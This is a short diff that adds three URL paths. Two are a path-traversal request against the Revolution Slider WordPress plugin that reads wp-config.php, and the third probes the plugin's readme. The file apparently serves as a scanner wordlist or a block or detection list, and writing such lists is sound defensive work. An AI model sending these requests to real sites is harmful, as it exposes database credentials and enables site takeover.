@@ -1,0 +1,3 @@
+/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+/wp-content/plugins/revslider/readme.txt
